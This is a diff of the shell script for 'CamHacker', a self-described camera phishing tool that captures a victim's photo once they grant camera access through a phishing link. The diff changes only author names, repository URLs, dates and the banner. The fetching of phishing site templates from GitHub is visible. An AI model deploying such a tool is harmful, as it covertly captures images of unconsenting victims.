@@ -3,13 +3,13 @@
 # CamHacker
 # Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : laughies
-# Github     : https://github.com/laughies
-# Email      : appigowda7338@gmail.com
+# Author     : KasRoudra
+# Github     : https://github.com/KasRoudra
+# Email      : kasroudrakrd@gmail.com
 # Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 25/02/2024
+# Date       : 5-09-2021
 # License    : MIT
-# Copyright  : laughies (2024-2025)
+# Copyright  : KasRoudra (2021-2022)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -17,7 +17,7 @@
 : '
 MIT License
 
-Copyright (c) 2024 laughies
+Copyright (c) 2022 KasRoudra
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -68,13 +68,13 @@ tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
-${green}  ____                 _   _            _
-${red}   / ___|__ _ _ __ ___  | | | | __ _  ___| | _____ _ __
-${cyan}  | |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
+${green}  ____                _   _            _
+${red} / ___|__ _ _ __ ___ | | | | __ _  ___| | _____ _ __
+${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
-${blue}                                    [By laughies]
+${blue}                                    [By KasRoudra]
 "
 
 loclx_help="
@@ -382,7 +382,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/laughies/CamHacker
+            cd .. && rm -rf CamHacker camhacker && git clone https://github.com/KasRoudra/CamHacker
             echo -e "\n${success}CamHacker updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
@@ -506,13 +506,13 @@ fi
 $red[Version]    ${cyan} :[${version}]
 $red[Description]${cyan} :[Camera Phishing tool]
 $red[Author]     ${cyan} :[KasRoudra]
-$red[Github]     ${cyan} :[https://github.com/laughies]
+$red[Github]     ${cyan} :[https://github.com/KasRoudra]
 $red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
 $red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://github.com/laughies/KasRoudra#My-Best-Works"
+        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
     elif echo $option | grep -q "0"; then
         echo -e "\n${success}Thanks for using!\n"
         exit 0
@@ -537,7 +537,7 @@ fi
 if ! [ -d sites ]; then
     mkdir sites
     netcheck
-    wget -q --show-progress "https://github.com/laughies/CamHacker/releases/latest/download/websites.zip"
+    wget -q --show-progress "https://github.com/KasRoudra/CamHacker/releases/latest/download/websites.zip"
     unzip websites.zip -d sites > /dev/null 2>&1
     rm -rf websites.zip
 fi
@@ -658,4 +658,3 @@ while true; do
     fi
     sleep 0.5
 done
-
